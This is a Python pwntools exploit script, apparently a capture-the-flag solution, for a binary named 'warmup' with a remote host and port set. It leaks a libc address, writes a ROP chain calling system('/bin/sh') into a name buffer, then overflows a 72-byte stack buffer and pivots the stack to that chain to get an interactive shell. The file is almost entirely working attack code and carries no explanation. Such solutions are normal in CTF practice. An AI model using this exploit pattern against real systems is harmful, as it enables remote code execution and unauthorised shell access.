#!/usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './warmup' # <-- change this
elf = context.binary = ELF(exe, checksec=True)
# libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = '/usr/lib/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h"]
host, port = '172.210.129.230', 1338 # <-- change this

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
break *main+167
'''.format(**locals())


# =========================================================
#                         NOTES
# =========================================================




# =========================================================
#                         EXPLOITS
# =========================================================
def exploit():
    global io
    io = initialize()
    rop = ROP(libc)
    
    io.recvuntil(b'0x')
    leak = int(io.recvline().strip(), 16)
    libc.address = leak - libc.sym['puts']
    success(f'leak: {hex(leak)}')
    success(f'libc base: {hex(libc.address)}')
    
    pop_rsp = 0x000000000040118e
    
    payload = flat(
        rop.rdi.address + libc.address,
        next(libc.search(b'/bin/sh\0')),
        0x000000000040101a,
        libc.sym['system']
        # 0x000000000040101a
    )
    
    io.sendlineafter(b'name', payload)
    
    payload = b'A' * 72 + p64(pop_rsp) + p64(elf.sym['name'])
    print(len(payload))
    io.sendlineafter(b'alright', payload)
    
    io.interactive()
    
if __name__ == '__main__':
    exploit()